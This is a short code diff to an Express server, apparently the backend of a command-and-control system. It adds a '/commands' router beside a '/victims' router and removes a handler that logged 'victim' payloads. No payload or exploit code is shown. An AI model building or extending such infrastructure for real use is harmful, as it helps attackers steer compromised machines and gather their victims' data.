@@ -1,5 +1,5 @@
 import express, { Request, Response } from 'express';
-import { victimRouter } from './routers';
+import { commandRouter, victimRouter } from './routers';
 
 const app = express();
 
@@ -10,6 +10,7 @@ app.use(express.urlencoded({ extended: false }));
 
 /* * Router endpoints * */
 app.use('/victims', victimRouter);
+app.use('/commands', commandRouter);
 
 /* * Entry endpoints * */
 /**
@@ -20,14 +21,6 @@ app.get('/health-check', (_req: Request, res: Response) =>
     message: `App is running well at port ${process.env.PORT}`,
   })
 );
-
-/**
- * Receive payload of victim endpoint
- */
-app.post('/', (req: Request, res: Response) => {
-  console.log(req.body);
-  return res.status(200).send();
-});
 
 // Server Listener
 app.listen(Number(process.env.PORT), () => {
